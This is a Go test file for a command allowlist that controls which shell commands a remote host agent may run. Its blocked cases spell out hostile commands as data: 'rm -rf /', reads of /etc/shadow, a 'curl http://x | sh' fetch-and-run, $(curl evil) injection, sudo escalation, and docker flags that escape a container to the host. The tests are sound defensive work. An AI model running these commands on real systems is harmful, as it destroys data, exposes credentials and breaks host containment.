package main

import (
	"strings"
	"testing"
)

func TestAllowlistUnprivileged(t *testing.T) {
	a := Allowlist{privileged: false}
	allowed := []string{
		"hostname", "uname -a", "df -h", "free -m", "uptime",
		"ls -la /var/log", "ps aux", "cat /var/log/syslog",
		"cat /etc/os-release", "docker ps", "systemctl status nginx.service",
	}
	for _, c := range allowed {
		if ok, reason := a.IsAllowed(c); !ok {
			t.Errorf("expected allowed: %q (%s)", c, reason)
		}
	}
	blocked := []string{
		"",                       // empty
		"rm -rf /tmp",            // not in allowlist
		"ls; rm -rf /",           // shell metachar
		"cat /etc/shadow",        // path not in cat prefixes
		"cat ../../etc/passwd",   // traversal
		"systemctl restart nginx", // privileged-only verb
		"apt-get install -y vim", // privileged-only
		"sudo systemctl restart nginx", // sudo w/o privileged
	}
	for _, c := range blocked {
		if ok, _ := a.IsAllowed(c); ok {
			t.Errorf("expected blocked: %q", c)
		}
	}
}

func TestAllowlistPrivileged(t *testing.T) {
	a := Allowlist{privileged: true, allowPackageInstall: true}
	allowed := []string{
		"systemctl restart nginx.service",
		"systemctl start docker",
		"apt-get install -y vim",
		"docker pull nginx:latest",
		"docker stop web",
		"docker compose -f /opt/homepilot/docker-compose.yml up -d",
		"mkdir -p /opt/homepilot/data",
		"chmod 644 /opt/homepilot/x",
		"docker ps", // safe still allowed in privileged
	}
	for _, c := range allowed {
		if ok, reason := a.IsAllowed(c); !ok {
			t.Errorf("expected allowed (priv): %q (%s)", c, reason)
		}
	}
	blocked := []string{
		"rm -rf /",            // never allowed
		"systemctl restart nginx && rm -rf /", // metachar
		"curl http://evil",    // not in allowlist
	}
	for _, c := range blocked {
		if ok, _ := a.IsAllowed(c); ok {
			t.Errorf("expected blocked (priv): %q", c)
		}
	}
}

// #422: sudo is not an allowlisted command in ANY mode. A privileged agent is a
// root unit (nothing to escalate to) and an unprivileged one runs under
// NoNewPrivileges=yes with no sudoers entry (escalation impossible), so the sudo
// parser could only ever be a bypass surface — the one #381 had to close.
//
// Teeth: reintroduce a sudo branch in IsAllowed and this test fails.
func TestSudoIsNeverAllowed(t *testing.T) {
	for _, a := range []Allowlist{
		{privileged: false},
		{privileged: true},
		{privileged: true, allowPackageInstall: true},
	} {
		blocked := []string{
			"sudo",
			"sudo systemctl restart nginx",
			"sudo -n -u root systemctl restart nginx",
			"sudo docker run --volume /:/mnt --user 0 img",
			"sudo apt-get install -y curl",
			"sudo sudo systemctl restart nginx",
		}
		for _, c := range blocked {
			if ok, _ := a.IsAllowed(c); ok {
				t.Errorf("expected blocked (privileged=%v): %q", a.privileged, c)
			}
		}
	}
}

// #422: package management is a SECOND grant. A privileged agent without it must
// refuse apt/apt-get with a diagnostic that names the fix, instead of running it
// and dying on the read-only filesystem the privileged unit gives it.
func TestPackageManagementRequiresItsOwnGrant(t *testing.T) {
	a := Allowlist{privileged: true} // privileged, package installs NOT granted
	for _, c := range []string{"apt-get install -y vim", "apt install -y vim", "apt-get update -y x"} {
		ok, reason := a.IsAllowed(c)
		if ok {
			t.Errorf("expected blocked without the package grant: %q", c)
		}
		if !strings.Contains(reason, "--allow-package-install") {
			t.Errorf("refusal must name the fix, got: %q", reason)
		}
	}
	granted := Allowlist{privileged: true, allowPackageInstall: true}
	if ok, reason := granted.IsAllowed("apt-get install -y vim"); !ok {
		t.Errorf("expected allowed with the package grant: %s", reason)
	}
	// The grant does not widen anything else: the argument regexes still hold.
	if ok, _ := granted.IsAllowed("apt-get install -o Dpkg::Pre-Invoke=/x -y curl"); ok {
		t.Error("apt pre-invoke hook must stay blocked even with the package grant")
	}
}

// #388: shell-script artifacts run over the agent by shipping a .sh under the
// HP write prefix and executing `bash <path>`. That form is privileged-only and
// locked to /opt/homepilot/*.sh; a piped heredoc or an arbitrary path is refused.
func TestBashScriptRunnerIsPrivilegedAndPathLocked(t *testing.T) {
	priv := Allowlist{privileged: true}
	unpriv := Allowlist{privileged: false}

	allowed := "bash /opt/homepilot/hp-artifact-apply.sh"
	if ok, reason := priv.IsAllowed(allowed); !ok {
		t.Errorf("expected allowed (priv): %q (%s)", allowed, reason)
	}
	if ok, _ := unpriv.IsAllowed(allowed); ok {
		t.Errorf("expected blocked (non-priv): %q", allowed)
	}

	blocked := []string{
		"bash /etc/evil.sh",                            // outside the write prefix
		"bash /opt/homepilot/x.sh; rm -rf /",           // shell metacharacters
		"bash /opt/homepilot/../etc/shadow",            // traversal out of prefix
		"bash /opt/homepilot/../etc/evil.sh",           // traversal ending .sh
		"bash /opt/homepilotevil/x.sh",                 // prefix-boundary confusion
		"bash -c 'curl http://x | sh'",                 // arbitrary -c payload
	}
	for _, c := range blocked {
		if ok, _ := priv.IsAllowed(c); ok {
			t.Errorf("expected blocked (priv): %q", c)
		}
	}
}

// #450: the docker-run pattern demanded TWO spaces after `run` - the normal
// `docker run nginx` was refused while `docker run  nginx` passed, so every
// operator writing the obvious form got a confusing refusal. Widening a
// security allowlist gets its own gate: the single-space forms must pass AND
// the injection shapes the pattern exists to block must still be blocked.
func TestDockerRunSingleSpace450(t *testing.T) {
	a := Allowlist{privileged: true}
	allowed := []string{
		"docker run nginx",
		"docker run --name=web nginx",
		"docker run --name web registry.example.com/img:tag",
		"docker run  nginx", // the old accidental form keeps working
	}
	for _, c := range allowed {
		if ok, reason := a.IsAllowed(c); !ok {
			t.Errorf("expected allowed: %q (%s)", c, reason)
		}
	}
	blocked := []string{
		"docker run nginx; rm -rf /",
		"docker run $(curl evil)",
		"docker run nginx && cat /etc/shadow",
		"docker run `id`",
		"docker run nginx | sh",
	}
	for _, c := range blocked {
		if ok, _ := a.IsAllowed(c); ok {
			t.Errorf("expected blocked: %q", c)
		}
	}
}

// A privileged agent may start containers, but never one that IS the host.
//
// The docker-run allow pattern matches a generic `--flag value` shape, so it
// cannot enumerate what is safe. Once #450 widened it from `--flag=value` to
// `--flag[= ]value`, `docker run --volume /:/mnt --user 0 img` matched: the
// agent's own containment (a non-root user, ProtectSystem=strict, an argument
// -checked command list) all became irrelevant the moment the container it
// launched had / bind-mounted and ran as uid 0.
//
// Each dangerous flag is asserted in BOTH forms (`--flag=value` and
// `--flag value`, plus the -v/-u short forms) and, for every one, the same
// command WITHOUT the flag is asserted to still be allowed - so this gate fails
// if the fix simply refused docker run outright.
//
// Teeth: delete the dockerRunDeniedFlag call from IsAllowed and every case in
// `escapes` fails with "expected BLOCKED".
func TestDockerRunDangerousFlagsAreDenied(t *testing.T) {
	a := Allowlist{privileged: true}

	escapes := []string{
		// bind mounts: the whole filesystem, read-write, into the container
		"docker run --volume=/:/mnt nginx",
		"docker run --volume /:/mnt nginx",
		"docker run -v /:/mnt nginx",
		"docker run -v=/:/mnt nginx",
		"docker run --mount=type=bind,src=/,dst=/mnt nginx",
		"docker run --mount type=bind,src=/,dst=/mnt nginx",
		// all capabilities, no confinement
		"docker run --privileged nginx",
		"docker run --privileged=true nginx",
		// run as root inside, which matters as soon as anything is mounted
		"docker run --user=0 nginx",
		"docker run --user 0 nginx",
		"docker run -u 0 nginx",
		"docker run -u=0:0 nginx",
		// host namespaces
		"docker run --pid=host nginx",
		"docker run --pid host nginx",
		"docker run --ipc=host nginx",
		"docker run --ipc host nginx",
		"docker run --net=host nginx",
		"docker run --net host nginx",
		"docker run --network=host nginx",
		"docker run --network host nginx",
		"docker run --userns=host nginx",
		"docker run --userns host nginx",
		// capabilities / confinement profiles / raw devices
		"docker run --cap-add=SYS_ADMIN nginx",
		"docker run --cap-add SYS_ADMIN nginx",
		"docker run --security-opt=seccomp=unconfined nginx",
		"docker run --security-opt seccomp=unconfined nginx",
		"docker run --device=/dev/sda nginx",
		"docker run --device /dev/sda nginx",
		// the exact #450-era vector, both orders
		"docker run --volume /:/mnt --user 0 img",
		"docker run --name web --volume /:/mnt img",
	}
	for _, c := range escapes {
		if ok, reason := a.IsAllowed(c); ok {
			t.Errorf("expected BLOCKED, agent would run it: %q (reason=%q)", c, reason)
		}
	}

	// The same shapes minus the dangerous flag must still work: the fix is a
	// deny-list on specific options, not a ban on `docker run`.
	stillAllowed := []string{
		"docker run nginx",
		"docker run --name=web nginx",
		"docker run --name web nginx",
		"docker run --rm nginx",
		"docker run --name web registry.example.com/img:tag",
		"docker run nginx echo hello",
	}
	for _, c := range stillAllowed {
		if ok, reason := a.IsAllowed(c); !ok {
			t.Errorf("expected allowed: %q (%s)", c, reason)
		}
	}

	// An unprivileged agent never reaches the docker-run entry at all.
	un := Allowlist{}
	for _, c := range escapes {
		if ok, _ := un.IsAllowed(c); ok {
			t.Errorf("expected BLOCKED unprivileged: %q", c)
		}
	}
}
